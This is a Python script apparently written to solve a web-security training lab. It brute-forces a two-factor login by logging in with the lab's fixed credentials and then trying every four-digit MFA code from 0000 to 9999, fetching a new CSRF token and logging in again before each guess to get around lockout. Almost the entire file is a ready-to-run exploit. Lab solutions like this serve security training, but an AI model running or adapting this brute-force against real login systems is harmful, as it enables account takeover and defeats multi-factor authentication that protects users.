import requests
import re
from bs4 import BeautifulSoup

def login(session, domain, csrf):
    return session.post(domain + '/login', data={'csrf': csrf,'username': 'carlos', 'password': 'montoya'}, allow_redirects=False)
    
def login2(session, domain, csrf, code):
    return session.post(domain + '/login2', data={'csrf': csrf, 'mfa-code': code}, allow_redirects=False)

def get_csrf(session, domain):
    r = session.get(domain)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def solve_lab(session, domain):
    for i in range(10000):
        code = str(i).zfill(4)
        csrf = get_csrf(session, domain + '/login')
        r1 = login(session, domain, csrf)
        if (r1.status_code == 302):
            print('Logged in')
        else:
            print('Login failed')
        csrf2 = get_csrf(session, domain + '/login2')
        print('Trying: ', code, end=' ')
        r = login2(session, domain, csrf2, code)
        if (r.status_code == 302):
            print()
            print('Login success with code: ', code)
            session.get(domain + '/my-account')
            break
        else:
            print('Failed')
        
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        try:
            solve_lab(session, domain)
            verify(session, domain)
        except requests.exceptions.ConnectionError:
            print('Connection Error. Please check your network connection.')